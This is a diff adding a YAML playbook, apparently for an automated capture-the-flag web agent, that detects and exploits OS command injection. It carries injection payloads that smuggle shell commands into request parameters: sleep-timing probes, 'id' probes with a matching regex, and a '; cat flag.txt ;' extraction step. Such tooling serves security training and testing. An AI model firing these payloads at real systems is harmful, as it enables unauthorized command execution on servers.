@@ -1,0 +1,69 @@
+id: web_cmdi
+name: Command Injection
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits OS command injection.
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+confidence_seeds:
+  - if: "any(p in context.params for p in ['ip', 'host', 'addr', 'cmd', 'exec', 'run'])"
+    boost: 0.30
+    label: "Command-prone parameter found"
+  - if: "any(p in context.found_paths for p in ['/ping', '/lookup', '/shell'])"
+    boost: 0.20
+    label: "Execution-related path found"
+
+detection:
+  min_confidence: 0.10
+  paths:
+    - id: blind_cmdi
+      name: "Blind Command Injection Detection"
+      steps:
+        - id: sleep_probe
+          action: http_probe
+          with:
+            payloads: 
+              - "; sleep 5 ;"
+              - "| sleep 5 |"
+              - "& sleep 5 &"
+              - "`sleep 5`"
+              - "$(sleep 5)"
+            inject_into: all_params
+          signals:
+            - match:
+                condition: "response_time >= 5000"
+              on_match:
+                confidence_boost: 0.90
+                emit: cmdi_blind_confirmed
+
+    - id: reflected_cmdi
+      name: "Reflected Command Injection Detection"
+      steps:
+        - id: id_probe
+          action: http_probe
+          with:
+            payloads: ["; id ;", "| id |", "`id`", "$(id)"]
+            inject_into: all_params
+          signals:
+            - match: 'uid=[0-9]+\(.*\) gid=[0-9]+\(.*\)'
+              on_match:
+                confidence_boost: 0.95
+                emit: cmdi_reflected_confirmed
+
+exploitation:
+  stop_on_flag: true
+  paths:
+    - id: cat_flag
+      name: "Cat Flag Extraction"
+      requires_signal: cmdi_reflected_confirmed
+      technique: direct_exec
+      steps:
+        - id: exec_cat
+          action: http_probe
+          with:
+            payload: "; cat flag.txt ;"
+            inject_into: vulnerable_param
